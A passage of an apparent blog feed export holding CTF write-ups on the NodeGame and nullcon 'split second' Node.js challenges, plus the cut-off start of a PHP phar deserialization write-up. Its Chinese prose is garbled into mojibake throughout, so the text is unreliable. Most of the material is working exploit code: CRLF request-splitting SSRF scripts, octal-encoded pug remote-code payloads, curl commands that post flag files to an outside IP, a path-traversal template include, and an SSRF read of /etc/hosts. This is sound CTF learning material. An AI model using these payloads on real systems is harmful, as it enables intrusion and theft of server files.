      <title>å•ç‹¬å¡«å‘-å…¬ç›Šèµ›NodeGame</title>
      <link href="2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/"/>
      <url>2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/</url>
      
        <content type="html"><![CDATA[<p>  ä»Šå¤©æ¥å¡«ä¸‹NodeGameçš„å‘å§ã€‚è¿™é“é¢˜ç¡®å®å‡ºçš„å¾ˆéš¾ã€‚è®°å¾—å½“æ—¶æ¯”èµ›ä¸­ä¹Ÿåªæœ‰å¤§æ¦‚8ä½å¸ˆå‚…åšå‡ºæ¥ã€‚è€Œå®é™…ä¸Šï¼Œå¾ˆå¤šå¸ˆå‚…åº”è¯¥éƒ½æ˜¯æœ‰æ€è·¯ä¸å‚è€ƒé¢˜ç›®ï¼Œä½†æ˜¯æœ€ç»ˆè¢«å°ç»†èŠ‚æ‰€å½±å“çš„ã€‚<br>è¿™é‡Œç»™å‡ºå‡ºé¢˜äººè‡ªå·±çš„å‡ºé¢˜æ€è·¯ï¼š<a href="http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game</a><br>å…¶ä¸­ä¸€é“ä»–å‚è€ƒçš„å›½é™…èµ›é¢˜ç›®wp:<br><a href="https://r3billions.com/writeup-split-second/" target="_blank" rel="noopener">https://r3billions.com/writeup-split-second/</a></p><a id="more"></a><h1 id="nullcon-hackim-2020-split-second"><a href="#nullcon-hackim-2020-split-second" class="headerlink" title="nullcon hackim-2020 split-second"></a>nullcon hackim-2020 split-second</h1><p>é¢˜ç›®æºç æˆ‘forkåå•ç‹¬æ”¾åœ¨è‡ªå·±githubä¸Šï¼Œæœ‰éœ€è¦è‡ªå–<br><a href="https://github.com/baiyecha404/hackim-web" target="_blank" rel="noopener">https://github.com/baiyecha404/hackim-web</a></p><p>å…ˆè®²è§£ä¸‹å‡ºé¢˜äººå¸ˆå‚…å‚è€ƒçš„é‚£é“å›½é™…èµ›çš„é¢˜ç›®å§ã€‚<br>é¦–å…ˆé¢˜ç›®çš„è·¯ç”±è·Ÿæˆ‘ä»¬è¿™é“NodeGameåŸºæœ¬ä¸€è‡´ï¼Œé¦–å…ˆä»flagè·¯ç”±å¯ä»¥çœ‹åˆ°</p><pre><code class="javascript">app.get(&#39;/flag&#39;, function(req, res) {    var ip = req.connection.remoteAddress;    if (ip.includes(&#39;127.0.0.1&#39;)) {        var authheader = req.headers[&#39;adminauth&#39;];        var pug2 = decodeURI(req.headers[&#39;pug&#39;]);        var x=pug2.match(/[a-z]/g);        if(!x){         if (authheader === &quot;secretpassword&quot;) {            var html = pug.render(pug2);         }        }       else{        res.send(&quot;No characters&quot;);      }    }    else{     res.send(&quot;You need to come from localhost&quot;);    }});</code></pre><p>coreè·¯ç”±æ˜¯ï¼š</p><pre><code class="javascript">app.get(&#39;/core&#39;, function(req, res) {    var q = req.query.q;    var resp = &quot;&quot;;    if (q) {        var url = &#39;http://localhost:8081/getMeme?&#39; + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send(&quot;&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;&quot;);        } else {            try {                http.get(url, function(resp) {                    resp.setEncoding(&#39;utf8&#39;);                    resp.on(&#39;error&#39;, function(err) {                    if (err.code === &quot;ECONNRESET&quot;) {                     console.log(&quot;Timeout occurs&quot;);                     return;                    }                   });                    resp.on(&#39;data&#39;, function(chunk) {                        resps = chunk.toString();                        res.send(resps);                    }).on(&#39;error&#39;, (e) =&gt; {                         res.send(e.message);});                });            } catch (error) {                console.log(error);            }        }    } else {        res.send(&quot;search param &#39;q&#39; missing!&quot;);    }})</code></pre><p>è¿˜æœ‰ä¸€ä¸ªé»‘åå•å‡½æ•°</p><pre><code class="javascript">function blacklist(url) {    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];    var arrayLen = evilwords.length;    for (var i = 0; i &lt; arrayLen; i++) {        const trigger = url.includes(evilwords[i]);        if (trigger === true) {            return true        }    }}</code></pre><p>ä»¥ä¸Šå°±æ˜¯æºç ä¸­é‡è¦éƒ¨åˆ†ã€‚é™¤æ­¤ä»¥å¤–è¿˜è¦å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œé¢˜ç›®ä½¿ç”¨çš„æ˜¯Nodejs8.12.ç‰ˆæœ¬ã€‚å¹¶ä¸”ä½¿ç”¨pugä½œä¸ºæ¨¡æ¿å¼•æ“ã€‚</p><pre><code class="javascript">var express = require(&#39;express&#39;);var app = express();var fs = require(&#39;fs&#39;);var path = require(&#39;path&#39;);var http = require(&#39;http&#39;);var pug = require(&#39;pug&#39;);</code></pre><p>è¿™ä¸ªç‰ˆæœ¬çš„Nodejså­˜åœ¨ä»€ä¹ˆæ¼æ´å‘¢ï¼Ÿå¦‚æœå»æœç´¢ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªCVE,ç±»å‹ä¸ºCRLF injectionã€‚å…·ä½“åˆ©ç”¨ä¹‹åå†æã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ†æä¸‹ä¸Šè¿°æºç çš„é‡è¦ä¹‹å¤„ï¼š<br>1./flag è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä¸€ä¸ªé‡ç‚¹æ˜¯è¦è¾¾æˆ<code>ip.includes(&#39;127.0.0.1)</code>ã€‚è¯´æ˜æˆ‘ä»¬å¯èƒ½éœ€è¦æ„é€ ä¸€ä¸ªssrf.åœ¨ipæ£€æŸ¥åï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæ¡ä»¶<code>authheader === &quot;secretpassword&quot;</code>è¿›è¡Œäº†httpå¤´çš„æ£€æŸ¥ï¼Œè¾¾æˆåå°†è¿›è¡Œ<code>pug</code>çš„æ¸²æŸ“ï¼Œè¯´æ˜å¯èƒ½è¾¾æˆNodejsçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œæ—¢ç„¶è¦å¯¹å¤´è¿›è¡Œæ£€æŸ¥ï¼Œè¯´æ˜æˆ‘ä»¬ç¡®å®å¯èƒ½éœ€è¦CRLFæ¼æ´æ¥è¿›è¡Œhttpå¤´çš„ä¼ªé€ ã€‚</p><p>2.coreè·¯ç”±å…è®¸æˆ‘ä»¬ä¼ é€’å‚æ•°qã€‚ä¹‹åä¸<code>http://localhost:8081/getMeme?</code>æ‹¼æ¥ï¼Œæ•´ä¸ªurlç»è¿‡ä¸€æ¬¡é»‘åå•æ£€æŸ¥åå°†æ‰§è¡Œã€‚æ‰€ä»¥ä¸Šé¢æ‰€éœ€çš„ssrfåœ¨è¿™å·²ç»å¸®æˆ‘ä»¬å‡†å¤‡å¥½äº†ã€‚åªéœ€è€ƒè™‘ç»•è¿‡å³å¯</p><p>3.é»‘åå•<br>ä»å…¶ä¸­å­˜åœ¨çš„å…³é”®å­—å°±å¯çœ‹å‡ºï¼Œè¿™æ˜¯Nodejså¸¸è§çš„å‘½ä»¤æ‰§è¡Œçš„æ¨¡æ¿ã€‚æˆ‘ä»¬ä»¥å‰ç”¨è¿‡çš„Nodejså‘½ä»¤æ‰§è¡Œpayload:</p><pre><code class="javascript">global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;)</code></pre><p>å°†ä¸èƒ½ç›´æ¥ä¼ å…¥ã€‚æ˜¾ç„¶è¿™é‡Œéœ€è¦å…¶ä»–é€”å¾„æ¥ç¼–ç ç»•è¿‡ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬æ¥å¤ç°ä¸‹,vpsä¸Šæ­å¥½ç¯å¢ƒï¼š<br>æˆ‘ä»¬çš„CRLFæ¼æ´ï¼Œå…è®¸æˆ‘ä»¬é€šè¿‡æ¢è¡Œæ„é€ headersã€‚åŒæ—¶ä¹Ÿå¯ä»¥æ„é€ æ‹†åˆ†ssrfã€‚åˆ©ç”¨æ¢è¡Œç»“æŸå‰ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶å‘é€å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><pre><code>GET /core?q=x HTTP/1.1GET /flag HTTP/1.1adminauth: secretpasswordpug: - xxx</code></pre><p>é‚£ä¹ˆæ˜ç¡®æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„æ–‡ä»¶å¤´</p><pre><code>GET /flag HTTP/1.1Host: 127.0.0.1adminauth: secretpasswordpug: - code dummy:  HTTP/1.1Host: localhost:8081Connection: close</code></pre><p>pugå¤„å¯ä»¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è€Œå…³é”®headersé‡Œçš„å‚æ•°å·²ç»ç»•è¿‡ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå¯ä»¥å¤§è‡´å†™å‡ºæˆ‘ä»¬éœ€è¦ç”¨CRLFæ³¨å…¥çš„å‘½ä»¤payloadï¼š</p><pre><code>SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE</code></pre><p>è€Œåªéœ€<code>/core?q=payload</code>å°±æ‰§è¡Œäº†SSRF+CRLFã€‚</p><p>è€Œä¸ºäº†bypasså¯¹pugçš„æ¸²æŸ“é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥é€‰æ‹©8è¿›åˆ¶ç»•è¿‡ã€‚å› ä¸ºå®ƒä¸åƒunicodeæˆ–è€…16è¿›åˆ¶é‚£æ ·å®¹æ˜“åŒ…å«å­—æ¯ã€‚æ‰€ä»¥ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚å¤§æ¦‚å¦‚ä¸‹å½¢å¼ï¼š</p><pre><code class="javascript">[][&quot;constructor&quot;]  æœ‰æ•ˆ[][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;] æœ‰æ•ˆï¼Œå¯æ‰§è¡Œ[][\42\143\157\156\163\164\162\165\143\164\157\162\42] æ— æ•ˆï¼Œå› ä¸ºåŒå¼•å·è¢«ç¼–ç äº†</code></pre><p>è¿™é‡Œå‚ç…§dalaoçš„exp<br><a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</a></p><p>(ç”¨çš„æ˜¯py2,æ‰€ä»¥ç”¨è™šæ‹Ÿæœºè·‘çš„æ‰æœ‰æ­£è§£):</p><pre><code class="python"># coding=UTF-8import requestsfrom requests.utils import quotedef toOct(str):    r=&quot;&quot;    for i in str:        if i&gt;=&#39;a&#39;and i&lt;=&#39;z&#39;:            r+=&#39;\\&#39;+oct(ord(i))[1:]        else:            r+=i    return r#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u{xxxx} is js encode pattern)#Buffer.from(&#39;http://example.com/\u{010D}\u{010A}/test&#39;, &#39;latin1&#39;).toString()#Unicode ÄÄŠ will convert to latin1 which will only pick up the right most byteSPACE=u&#39;\u0120&#39;.encode(&#39;utf-8&#39;)CRLF=u&#39;\u010d\u010a&#39;.encode(&#39;utf-8&#39;)  # transfer from unicode to utf-8 (\uxxxx is unicode&#39;s pattern)SLASH=u&#39;\u012f&#39;.encode(&#39;utf-8&#39;)pug = toOct(&#39;&#39;&#39;-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 120.27.246.202:8888 -X POST -d $(cat fl*)&#39;))&quot;)()&#39;&#39;&#39;).replace(&#39;&quot;&#39;,&#39;%22&#39;).replace(&quot;&#39;&quot;,&quot;%27&quot;)#&#39; and &quot; need to be double encodedprint quote(pug)payload=&#39;sol&#39;+SPACE+&#39;HTTP&#39;+SLASH+&#39;1.1&#39;+CRLF*2+&#39;GET&#39;+SPACE+SLASH+&#39;flag&#39;+SPACE+&#39;HTTP&#39;+SLASH+&#39;1.1&#39;+CRLF+&#39;x-forwarded-for:&#39;+SPACE+&#39;127.0.0.1&#39;+CRLF+&#39;adminauth:&#39;+SPACE+&#39;secretpassword&#39;+CRLF+&#39;pug:&#39;+SPACE+pug+CRLF+&#39;test:&#39;+SPACEres=requests.get(&#39;http://120.27.246.202:8081/core?q=&#39;+quote(payload))#res=requests.get(&#39;http://web2.ctf.nullcon.net:8081/core?q=&#39;+requote_uri(payload))print res.content</code></pre><p>è„šæœ¬ä¸­æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š<br>1.å•å¼•å·ä¸åŒå¼•å·å‡éœ€è¦ç¼–ç ä¸¤æ¬¡æ¥ç»•è¿‡é»‘åå•ã€‚<br>2.payloadæ‰§è¡Œæ—¶æ˜¯ç”¨<code>- code</code>çš„å½¢å¼æ‰§è¡Œçš„ã€‚è¿™æ˜¯pugçš„ç‰¹æ€§ã€‚è¿˜å¯ä»¥<code>#{}</code>ä½†æ˜¯è¢«è¿‡æ»¤äº†<br>åŒæ—¶è¿˜å­¦åˆ°äº†javascriptä¸­ç­‰ä»·çš„è¡¨è¾¾æ–¹å¼ï¼Œæ¯”å¦‚æ‰€å‚è€ƒçš„dalaoçš„payloadä¸­ç”¨åˆ°äº†</p><pre><code class="javascript">[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;console.log(payload)&#39;)()</code></pre><p>ç­‰ä»·äº</p><pre><code class="javascript">[].constructor.constructor(&#39;alert(12345)&#39;)()</code></pre><p>ç­‰ä»·äº</p><pre><code class="javascript">Array.constructor(&#39;alert(12345)&#39;)()</code></pre><p>ç›¸å½“äºå€Ÿç”¨äº†æ•°ç»„çš„æ„é€ æ–¹æ³•æ¥è°ƒç”¨å‘½ä»¤ã€‚<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å¥‡æ€ªçš„æ˜¯æˆ‘åˆæ²¡å¼¹åˆ°shellã€‚curlå‘½ä»¤åˆ°æ˜¯æ²¡å•¥é—®é¢˜</p><h1 id="NodeGame"><a href="#NodeGame" class="headerlink" title="NodeGame"></a>NodeGame</h1><p>å‡ºé¢˜äººæ€è·¯å¾ˆç®€å•ï¼Œæ—¢ç„¶è¿™ä¸ªCRLF+ssrfæ¼æ´å¯ä»¥æ„é€ headers,é‚£æ„é€ æ–‡ä»¶ä¸Šä¼ ä¹Ÿå¯ä»¥å–½ã€‚æ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªé¢˜ç›®<br>å…ˆæ¥çœ‹ç»™çš„æºç </p><pre><code class="javascript">var express = require(&#39;express&#39;);var app = express();var fs = require(&#39;fs&#39;);var path = require(&#39;path&#39;);var http = require(&#39;http&#39;);var pug = require(&#39;pug&#39;);var morgan = require(&#39;morgan&#39;);const multer = require(&#39;multer&#39;);app.use(multer({dest: &#39;./dist&#39;}).array(&#39;file&#39;));app.use(morgan(&#39;short&#39;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;)))app.get(&#39;/&#39;, function(req, res) {    var action = req.query.action?req.query.action:&quot;index&quot;;    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) ){        res.send(&quot;Errrrr, You have been Blocked&quot;);    }    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);    var html = pug.renderFile(file);    res.send(html);});app.post(&#39;/file_upload&#39;, function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: &#39;&#39;,    }    if (!ip.includes(&#39;127.0.0.1&#39;)) {        obj.msg=&quot;only admin&#39;s ip can use it&quot;        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = &#39;upload failed&#39;;            res.send(JSON.stringify(obj));        }else{            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: &#39;upload success&#39;,                    filename: file_path + file_name                }             } catch (error) {                obj.msg = &#39;upload failed&#39;;            }            res.send(JSON.stringify(obj));            }    })})app.get(&#39;/source&#39;, function(req, res) {    res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;));});app.get(&#39;/core&#39;, function(req, res) {    var q = req.query.q;    var resp = &quot;&quot;;    if (q) {        var url = &#39;http://localhost:8081/source?&#39; + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);        } else {            try {                http.get(url, function(resp) {                    resp.setEncoding(&#39;utf8&#39;);                    resp.on(&#39;error&#39;, function(err) {                    if (err.code === &quot;ECONNRESET&quot;) {                     console.log(&quot;Timeout occurs&quot;);                     return;                    }                   });                    resp.on(&#39;data&#39;, function(chunk) {                        try {                         resps = chunk.toString();                         res.send(resps);                        }catch (e) {                           res.send(e.message);                        }                    }).on(&#39;error&#39;, (e) =&gt; {                         res.send(e.message);});                });            } catch (error) {                console.log(error);            }        }    } else {        res.send(&quot;search param &#39;q&#39; missing!&quot;);    }})function blacklist(url) {    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];    var arrayLen = evilwords.length;    for (var i = 0; i &lt; arrayLen; i++) {        const trigger = url.includes(evilwords[i]);        if (trigger === true) {            return true        }    }}var server = app.listen(8081, function() {    var host = server.address().address    var port = server.address().port    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)})</code></pre><p>å…³äº<code>/core</code>ä¸ç”¨å¤šè¯´ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ï¼Œè€Œå…³äº<code>file_upload</code>åˆ™ç±»ä¼¼ä¸Šé¢é‚£é¢˜çš„<code>/flag</code>ã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾æ–‡ä»¶ä¸Šä¼ çš„æ‰§è¡Œç‚¹åœ¨å“ªã€‚</p><pre><code class="javascript">app.get(&#39;/&#39;, function(req, res) {    var action = req.query.action?req.query.action:&quot;index&quot;;    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) ){        res.send(&quot;Errrrr, You have been Blocked&quot;);    }    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);    var html = pug.renderFile(file);    res.send(html);});</code></pre><p>çœ‹åˆ°é¦–é¡µæ¥å—äº†ä¸€ä¸ªactionå‚æ•°ï¼Œä¼šå°†æˆ‘ä»¬ä¸Šä¼ åˆ°/template/ç›®å½•ä¸‹çš„æ–‡ä»¶pugæ¸²æŸ“ã€‚å¹¶ä¸”è¿”å›å€¼ã€‚è¿™æ ·çš„è¯æˆ‘ä»¬æ€è·¯å¤§è‡´å°±æ¸…æ™°äº†ï¼š<br>è¿˜æ˜¯é€šè¿‡coreè¿›è¡Œssrfå¹¶ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„httpåŒ…è®¿é—®åˆ°/flagã€‚ä¹‹åç›´æ¥é¦–é¡µæ–‡ä»¶åŒ…å«è§¦å‘æ¸²æŸ“ï¼Œå°±å¯ä»¥è®¿é—®åˆ°å†…å®¹ã€‚<br>ç”±äºè¿™é‡Œç›´æ¥æ„é€ å¤´å¤ªéº»çƒ¦ï¼Œæ‰€ä»¥è¦å…ˆæŠ“ä¸ªç°æˆçš„pugæ–‡ä»¶ä¸Šä¼ åŒ…ä¼ªé€ ä¸‹ï¼Œæ³¨æ„åŒ…é‡Œé¢çš„</p><pre><code>Content-Type: /../templateContent-Length:292Connection:keep-alive</code></pre><p>ç­‰å‚æ•°ä¸å¯éšä¾¿ä¹±æ”¹<br>è¿™é‡Œå€Ÿèµµå¸ˆå‚…è„šæœ¬å°æ”¹ä¸‹ï¼š<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><pre><code class="python">import urllib.parseimport requestspayload = &#39;&#39;&#39; HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Content-Type: multipart/form-data; boundary=--------------------------191691572411478Connection: keep-alivecache-control: no-cacheHost: xContent-Length: 292-----------------------------191691572411478Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;exp.pug&quot;Content-Type: /../templatedoctype htmlhtml  head    style      include ../../../../../../../flag.txt----------------------------919695033422425209299810--GET /flag HTTP/1.1Host: xConnection: closex:&#39;&#39;&#39;payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)print(payload)r = requests.get(&#39;http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))print(r.text)</code></pre><p>ä¹Ÿæ˜¯å¸¸è§„çš„æŠŠæ„é€ å¥½çš„requestç”¨å­—ç¬¦ç»•è¿‡ã€‚å½“ç„¶æˆ‘ä»¬ä¸Šä¸€é“é¢˜çš„å…«è¿›åˆ¶ç­‰ç­‰å…¶ä»–ç»•è¿‡æˆ‘è§‰å¾—éƒ½å¯ä»¥ï¼Œæ¯•ç«Ÿæ­¤å¤„æ²¡é™åˆ¶urlä¼ å‚ä¸å«å­—æ¯ã€‚</p><pre><code>/?action=exp</code></pre><p>æˆåŠŸåŒ…å«flag<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å€¼å¾—ä¸€æçš„æ˜¯æˆ‘æƒ³ç”¨curlç­‰ç­‰æ—¶åˆå¤±è´¥äº†ï¼Œæˆ‘æŒ‰å‡ºé¢˜äººç»™çš„æ–¹æ³•æ„é€ åŒ…é‡Œç›´æ¥æ”¾å‘½ä»¤ï¼Œç»“æœå¾ˆæ— è¯­ï¼š</p><pre><code>POST /file_upload HTTP/1.1Host: localhost:8081Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942Content-Length: 6279Origin: http://localhost:8081Connection: closeReferer: http://localhost:8081/?action=uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;byc403.pug&quot;Content-Type: ../template- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://120.27.246.202:8877 -X POST -d $(cat /flag.txt)&#39;)-----------------------------12837266501973088788260782942--</code></pre><p><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error"><br>æç¤ºä¸èƒ½ Couldnâ€™t connect to server.<br>ç„¶è€Œå‡ºé¢˜äººçš„expé‡Œå°±æ˜¯ç”¨çš„execSync+curlã€‚æˆ‘ä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µã€‚æ¯•ç«Ÿå…¬ç›Šèµ›ä¸¤é“nodeé¢˜éƒ½å·²ç»è¯å®ä¸èƒ½<code>curl,wget,nc,bash</code>ç­‰ç­‰åå¼¹shellæˆ–è€…è¿å¤–ç½‘çš„æ“ä½œã€‚æ„Ÿè§‰å¾ˆè¿·ã€‚é‚£åªèƒ½æŒ‰èµµå¸ˆå‚…é‚£æ ·includeäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF-phar-matches-everythingå¡«å‘</title>
      <link href="2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/"/>
      <url>2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰æ ¡èµ›webæœ€éš¾çš„ä¸€é“é¢˜â€¦â€¦å½“æ—¶æ°´å¹³èœçš„çœ‹éƒ½ä¸æ•¢çœ‹ï¼Œç°åœ¨æŒ‰å¸ˆå‚…è¦æ±‚æ¥åšåšè¿™é“é¢˜ã€‚(zjyå¸ˆå‚…è¯´è¿™é¢˜æŠŠphpç›¸å…³çŸ¥è¯†å‡ ä¹å…¨è€ƒäº†ï¼Œçœ‹æ¥æ˜¯å¾ˆé›†å¤§æˆçš„ä¸€é“é¢˜ç›®ã€‚)</p><p>é¢˜ç›®é¦–å…ˆè¿›å»åæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ä»…é™åˆ¶å›¾ç‰‡çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚å¦ä¸€ä¸ªæ˜¯ç”¨<code>getimagesize()</code>æ­é…çš„è¯»å–å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯çš„åŠŸèƒ½</p><p>é¦–å…ˆæ˜¯æºç æ³„éœ²ã€‚åœ¨catchmachine.phpå­˜åœ¨<code>.swp</code>æ³„éœ²ã€‚ç„¶è€Œbuuojä¸Šé¢˜ç›®å¹¶æ²¡æœ‰æ³„éœ²ï¼Œç›´æ¥çœ‹æºç å¥½äº†</p><a id="more"></a><pre><code class="php">&lt;?phpclass Easytest{    protected $test;    public function funny_get(){        return $this-&gt;test;    }}class Main {    public $url;    public function curl($url){        $ch = curl_init();          curl_setopt($ch,CURLOPT_URL,$url);        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);        $output=curl_exec($ch);        curl_close($ch);        return $output;    }    public function __destruct(){        $this_is_a_easy_test=unserialize($_GET[&#39;careful&#39;]);        if($this_is_a_easy_test-&gt;funny_get() === &#39;1&#39;){            echo $this-&gt;curl($this-&gt;url);        }    }    }if(isset($_POST[&quot;submit&quot;])) {    $check = getimagesize($_POST[&#39;name&#39;]);    if($check !== false) {        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;    } else {        echo &quot;File is not an image.&quot;;    }}?&gt;</code></pre><p>Mainç±»é‡Œçš„<code>__destruct()</code>å±…ç„¶å­˜åœ¨ååºåˆ—åŒ–ï¼Œå¾ˆæœ‰æ„æ€ã€‚ç„¶åå¦‚æœç»•è¿‡è¿™ä¸ªç‚¹å°†æ‰§è¡Œä¸€æ®µ<code>curl</code>ï¼Œè¿™åˆæ˜¯ssrfçš„ç‚¹äº†ã€‚ä½†æ˜¯æˆ‘ä»¬åˆè¦ç»•è¿‡<code>getimagesize</code>çš„æ£€æŸ¥ï¼Œè¿™å°±å¾—åˆ©ç”¨åˆ°pharååºåˆ—åŒ–äº†ï¼Œå› ä¸ºpharèƒ½ç»•è¿‡ç»å¤§éƒ¨åˆ†æ–‡ä»¶çš„æ£€æŸ¥ã€‚<br>æ—¢ç„¶å¦‚æ­¤å…ˆssrfè¯»æ–‡ä»¶<br>é‚£ä¹ˆæ„é€ exp:</p><pre><code class="php">&lt;?phpclass Easytest{    protected $test=&quot;1&quot;;    public function funny_get(){        return $this-&gt;test;    }}class Main {    public $url=&quot;file:///etc/hosts&quot;;    public function curl($url){        $ch = curl_init();        curl_setopt($ch,CURLOPT_URL,$url);        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);        $output=curl_exec($ch);        curl_close($ch);        return $output;    }    public function __destruct(){        